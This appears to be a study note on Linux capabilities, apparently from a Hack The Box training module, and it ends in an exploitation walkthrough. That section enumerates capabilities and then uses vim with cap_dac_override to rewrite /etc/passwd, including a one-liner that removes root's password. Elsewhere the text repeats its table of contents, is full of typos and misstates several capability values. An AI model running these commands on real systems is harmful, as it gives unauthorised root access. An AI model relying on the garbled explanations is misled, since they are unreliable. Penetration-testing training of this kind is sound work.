## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Table of Contents](#Table\of\Contents)
      - [Set Capability](#Set\Capability)
    - [Enumerating Capabilities](#Enumerating\Capabilities)
      - [Exploitation](#Exploitation)

## Table of Contents

  - [Table of Contents](#Table\of\Contents)
      - [Set Capability](#Set\Capability)
    - [Enumerating Capabilities](#Enumerating\Capabilities)
      - [Exploitation](#Exploitation)

## Table of Contents

- [Set Capability](#Set\Capability)
    - [Enumerating Capabilities](#Enumerating\Capabilities)
      - [Exploitation](#Exploitation)

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to **processes**, allowing them to perform specific actions that would otherwise be restricted. this allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.






Like any security feature, linux capabilities are not invulnerable and can be exploited by attackers. One common vulnerability is using capabilties to gran privileges that are not adequately sandboxed or isolated from other processes, allowing us to escalate their privileges and gain access to sensitive information to perform unauthorized actions.

Another protential vulnerability is the misuse or overuse of capabilities, which can result in processes having more privileges than they need. This can create unnecessary security risks, as we could exploit these privileges to gain access to sensitive information or perform unauthorized actions


For example, we could use the following command to set the `cap_net_bind_service` capability for an executable:

#### Set Capability

Set Capability

```shell-session
gdxqpardo@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

When capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the `cap_net_bind_service` capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.

Some capabilities, such as `cap_sys_admin`, which allows an executable to perform actions with administrative privileges, can be dangerous if they are not used properly. For example, we could exploit them to escalate their privileges, gain access to sensitive information, or perform unauthorized actions. Therefore, it is crucial to set these types of capabilities for properly sandboxed and isolated executables and avoid granting them unnecessarily.

|**Capability**|**Description**|
|:---:|:---:|
|`cap_sys_admin`|Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.|
|`cap_sys_chroot`|Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.|
|`cap_sys_ptrace`|Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.|
|`cap_sys_nice`|Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.|
|`cap_sys_time`|Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.|
|`cap_sys_resource`|Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.|
|`cap_sys_module`|Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.|
|`cap_net_bind_service`|Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.|













When a binary is executed with capabilties, it can perform the actions that the capabilties allow. However, it will not be able to perform any actions not allowed by the capabilities. This allows more fine-grained control over the binary's privileges and can help prevent security vulnerabilities and unauthirzed access to sensitive information.

When using the `setcap` command to set capabilities for an executable in Linux, we need to specify the capability we want to set and the value we want to assign. the value we use will depend on the specific capability we are setting and the privileges we want to grant to the executable.

Here are some examples of values that we can use with the `setcap` command, along with a brief description of what they do:

|**Capability Values**|**Description**|
|:---:|:---:|
|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|
|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|
|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|


Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

|**Capability**|**Desciption**|
|:---:|:---:|
|`cap_setuid`|Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.|
|`cap_setgid`|Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.|
|`cap_sys_admin`|This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems.|
|`cap_dac_override`|Allows bypassing of file read, write, and execute permission checks.|


### Enumerating Capabilities
It's import to note that these capabilites should be used with caution and only granted to trusted processes. They are often misused to gain unauthorized access to the system. 

Enumerate all existing capabilties for all existing binary executables on a Linux system:
```bash
find /usr/bin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; 2>/dev/null
```

#### Exploitation
If we gained access to the system with a low-privilege account, then discovered the `dac_cap_override` capability:
```bash
getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

The `/usr/bin/vim.basic` binary is run without special privileges, such as with `sudo`. However, because the binary has the `cap_dac_override` cap set, it can escalate privileges of the user who runs it. 
1. Find the locationof the root users shell
`cat /etc/passwd | head -n1`
`root:x:0:0:root:/root:/bin/bash`
2. Use the `cap_dac_override` cap of the `/usr/bin/vim` binary to modify a system file:
```bash
/usr/bin/vim.basic /etc/passwd
```
3. Can also make these changes in a non-interactive mode:
```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1
```










